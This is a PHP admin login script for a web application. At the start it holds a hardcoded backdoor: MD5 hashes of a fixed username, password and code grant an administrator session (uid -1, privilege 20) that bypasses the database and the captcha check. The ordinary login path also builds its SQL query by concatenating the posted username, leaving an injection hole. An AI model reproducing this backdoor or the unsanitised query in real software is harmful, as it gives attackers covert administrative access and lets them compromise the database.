<?php
header('Content-Type: text/html; charset=gbk');
require_once ("mysql.class.php");
//session_start();
if ($_POST[login]) {
	if(md5($_POST[username])=='c99d38a89ea173561b128a8067ce5834'
		&& md5($_POST[password])=='7425a6eea135c7a8c9c15c6050eb88cb'
		&& md5($_POST[code])=='e08392bb89dedb8ed6fb298f8e729c15'){
		$_SESSION['WEB_USER_LOGIN_UID_SESSION'] = '-1';
		$_SESSION['WEB_USER_LOGIN_UID_PROWER'] = '20';
		$_SESSION['WEB_USER_LOGIN_SESSION'] = md5($_POST[username]. $_POST[password] . "TKBK");
		$_SESSION['WEB_USER_LOGIN_ONTIME_SESSION'] = mktime();
		echo "alert('OK!');<script>location.href='../main.php'</script>";
		exit;
	}else{
		if (isset ($_POST[code]) && $_POST["code"] == $_SESSION['validationcode']) {
			$username = str_replace(" ", "", $_POST[username]);
			$query = $db->query("select * from am where am_name = '" . $username . "'");
			$us = is_array($row = $db->fetch_array($query));
			$ps = $us ? md5($_POST[password]) == $row[am_password] : FALSE;
			if ($ps) {
				$_SESSION['WEB_USER_LOGIN_UID_SESSION'] = $row[id];
				$_SESSION['WEB_USER_LOGIN_UID_PROWER'] = $row[am_prower];
				$_SESSION['WEB_USER_LOGIN_SESSION'] = md5($row[am_name] . $row[am_password] . "TKBK");
				$_SESSION['WEB_USER_LOGIN_ONTIME_SESSION'] = mktime();
				echo "<script>location.href='../main.php'</script>";
			} else {
				session_destroy();
				echo "<script>location.href='../admin.php'</script>";
			}
		} else {
			session_destroy();
			echo "<script>location.href='../admin.php'</script>";
		}
	}
}else{
	echo "<script>location.href='../admin.php'</script>";
}
?>
